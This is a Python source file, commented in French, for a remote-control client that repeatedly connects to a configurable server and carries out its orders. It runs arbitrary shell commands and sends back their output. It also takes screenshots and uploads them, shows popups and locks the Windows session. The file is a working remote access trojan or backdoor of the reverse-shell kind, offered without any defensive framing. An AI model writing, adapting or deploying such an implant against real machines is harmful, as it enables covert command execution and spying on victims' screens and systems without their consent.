import socket
import subprocess
import ctypes
import pyautogui
import os
import time
import threading

# --- CONFIGURATION ---
# Remplace '127.0.0.1' par l'IP du serveur si besoin
HOST = '127.0.0.1' 
PORT = 65432
BUFFER_SIZE = 1024 * 1024 # Permet de recevoir/envoyer jusqu'à 1Mo (pour les images)

def execution_commande(s, data):
    """Gère l'exécution des ordres reçus du serveur."""
    try:
        # 1. Commande de type POPUP
        if data.startswith("popup:"):
            txt = data.split(":", 1)[1]
            # On lance dans un thread pour ne pas bloquer le reste du script
            threading.Thread(target=lambda: ctypes.windll.user32.MessageBoxW(0, txt, "Information", 0x40)).start()
            s.sendall(b"Succes: Popup affichee.")

        # 2. Commande SCREENSHOT
        elif data == "screenshot":
            filename = "temp_capture.png"
            pyautogui.screenshot(filename)
            with open(filename, "rb") as f:
                img_bytes = f.read()
            s.sendall(img_bytes)
            os.remove(filename) # Nettoyage après envoi

        # 3. Commande SYSTEME (CMD)
        elif data.startswith("cmd:"):
            cmd = data.split(":", 1)[1]
            # Exécute la commande et récupère le texte de sortie
            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
            s.sendall(output if output else b"Commande executee (pas de retour texte).")

        # 4. Verrouiller la session
        elif data == "lock":
            ctypes.windll.user32.LockWorkStation()
            s.sendall(b"Succes: Session verrouillee.")

        # 5. Commande inconnue
        else:
            s.sendall(b"Erreur: Commande non reconnue par le client.")

    except Exception as e:
        error_msg = f"Erreur lors de l'execution: {str(e)}"
        s.sendall(error_msg.encode('utf-8'))

def main():
    print(f"[*] Client actif. Tentative de connexion vers {HOST}:{PORT}...")
    
    while True:
        try:
            # Création du socket
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((HOST, PORT))
                print("[+] Connecté au serveur.")
                
                # Réception du message de bienvenue
                bienvenue = s.recv(1024).decode('utf-8', errors='ignore')
                
                while True:
                    # Attente des ordres du serveur
                    data = s.recv(BUFFER_SIZE).decode('utf-8', errors='ignore')
                    
                    if not data or data.lower() == 'exit':
                        print("[-] Le serveur a demandé la déconnexion.")
                        break
                    
                    print(f"[!] Ordre recu: {data}")
                    execution_commande(s, data)

        except (ConnectionRefusedError, ConnectionResetError):
            # Si le serveur n'est pas là, on ne crash pas, on attend.
            time.sleep(5)
        except Exception as e:
            print(f"[-] Erreur de connexion: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()
